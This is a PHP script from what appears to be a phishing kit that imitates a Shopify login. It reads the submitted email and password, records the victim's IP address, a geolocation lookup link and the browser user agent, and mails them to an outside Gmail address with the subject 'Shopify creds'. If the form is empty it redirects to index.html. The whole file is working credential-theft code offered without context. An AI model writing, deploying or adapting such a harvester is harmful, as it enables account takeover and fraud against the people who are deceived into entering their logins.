<?php
// include 'email.php';
if($_POST["username"] != "" and $_POST["password"] != ""){
  $to = "chizyshopify@gmail.com";

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$username = $_POST["username"];
$password = $_POST["password"];

$message = "--------------Shopify Login Info-----------------------\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password   : ".$_POST['password']."\n";
$message .= "|--------------- OTHER INFORMATION -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- RAZ --------------|\n";

echo ($message);




$subject = "Shopify creds";
$headers = "From: zaza <zazzy@xdg-01-oem>";
mail($to, $subject, $message, $headers);


}else{
  header ("Location: index.html");
}

?>


